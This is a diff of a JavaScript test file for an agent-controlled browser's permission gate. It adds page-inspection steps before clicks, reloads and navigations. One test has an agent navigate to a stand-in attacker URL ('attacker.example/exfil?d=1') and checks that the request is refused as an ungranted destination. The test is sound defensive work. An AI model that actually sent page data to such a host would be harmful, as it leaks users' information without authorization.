@@ -89,7 +89,7 @@ async function fixture(t) {
     id, workspaceId, version: 1, controller: 'available', view: { webContents: {
       getURL: () => pages[id], getTitle: () => 'Fixture', stop: () => {}, reload: () => {}, isDestroyed: () => false, close: () => {},
       loadURL: async url => { pages[id] = url; }, navigationHistory: { canGoBack: () => false, canGoForward: () => false },
-      executeJavaScript: async source => { scripts.push(source); return /element\.click\(\)|new Event\('input'/.test(source) ? { submitted: true, outcome: 'unverified' } : { url: pages[id], title: 'Fixture', text: pageText, links: [] }; },
+      executeJavaScript: async source => { scripts.push(source); return /element\.click\(\)|new Event\('input'|\("(?:click|fill)", \{/.test(source) ? { ok: true, submitted: true, outcome: 'unverified' } : { url: pages[id], title: 'Fixture', text: pageText, links: [] }; },
     } },
   });
   browser.activeId = 1;
@@ -158,6 +158,8 @@ test('approve-then-execute round trip binds the exact command, arguments, actor 
   const otherActor = await f.grant({ scopes: ['read', 'tabs.control'], autonomy: 'scoped' });
   assert.equal((await f.rest('page.click', clickArgs(f), otherActor.token)).error.code, 'approval_required', 'another client cannot use this approval');
   assert.equal(f.scripts.length, 0);
+  // The gate runs first; the browser's per-actor inspection-before-input rule still applies after approval.
+  assert.equal((await f.rest('page.inspect', { workspaceId: f.firstId, tabId: 1 }, agent.token)).error, null);
   const executed = await f.rest('page.click', clickArgs(f), agent.token);
   assert.equal(executed.error, null, JSON.stringify(executed.error));
   assert.equal(executed.result.outcome, 'unverified');
@@ -180,6 +182,7 @@ test('standing approvals cover the same destination until expiry; once-only clas
   const approvalId = first.error.details.authority.approvalId;
   assert.equal((await f.dispatch('approvals.approve', { id: approvalId, mode: 'standing', standingMinutes: 5 }, human)).error, null);
   for (let i = 0; i < 2; i++) {
+    assert.equal((await f.rest('page.inspect', { workspaceId: f.firstId, tabId: 1 }, agent.token)).error, null);
     const outcome = await f.rest('page.reload', { workspaceId: f.firstId, tabId: 1, expectedVersion: f.browser.tab(1).version }, agent.token);
     assert.equal(outcome.error, null, JSON.stringify(outcome.error));
   }
@@ -271,6 +274,7 @@ test('purpose-bound grants enforce scope changes, destinations, data classes, us
   assert.equal((await f.rest('page.readable', { workspaceId: f.firstId, tabId: 1 }, agent.token)).error, null);
   const navigate = await f.rest('page.navigate', { workspaceId: f.firstId, tabId: 1, expectedVersion: 1, url: 'https://attacker.example/exfil?d=1' }, agent.token);
   assert.equal(navigate.error.details.authority.reason, 'destination_not_granted');
+  assert.equal((await f.rest('page.inspect', { workspaceId: f.firstId, tabId: 1 }, agent.token)).error, null);
   assert.equal((await f.rest('page.navigate', { workspaceId: f.firstId, tabId: 1, expectedVersion: 1, url: 'https://docs.example.com/guide' }, agent.token)).error, null);
   assert.equal((await f.rest('page.screenshot', { workspaceId: f.firstId, tabId: 1 }, agent.token)).error.details.authority.reason, 'data_class_not_granted');
   assert.equal((await f.rest('history.list', { workspaceId: f.firstId }, agent.token)).error.details.authority.reason, 'data_class_not_granted');
